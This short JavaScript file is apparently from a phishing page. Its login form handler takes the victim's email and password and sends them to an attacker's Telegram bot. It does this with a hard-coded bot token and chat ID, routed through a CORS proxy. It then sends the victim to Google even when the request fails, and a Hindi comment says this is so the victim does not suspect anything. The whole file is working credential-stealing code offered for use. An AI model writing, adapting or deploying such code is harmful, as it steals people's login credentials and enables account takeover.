document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const telegramToken = '6717477751:AAG6phDMwqdQiKFN6n3_28Fp51NmRvmuCsg';
            const chatId = '7732354688';
            const message = "Target Logged In!\nEmail: " + email + "\nPassword: " + password;

            // Proxy URL (यह Network Error को खत्म कर देगा)
            const proxyUrl = "https://corsproxy.io/?";
            const targetUrl = "https://api.telegram.org/bot" + telegramToken + "/sendMessage";

            fetch(proxyUrl + encodeURIComponent(targetUrl), {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(function(response) {
                // चाहे Error आए या Success, हम यूजर को Google पर भेज देंगे
                window.location.href = "https://www.google.com";
            })
            .catch(function(error) {
                // अगर नेटवर्क एरर आए, तो भी पेज को Google पर भेजें ताकि शक न हो
                window.location.href = "https://www.google.com";
            });
        });
    }
});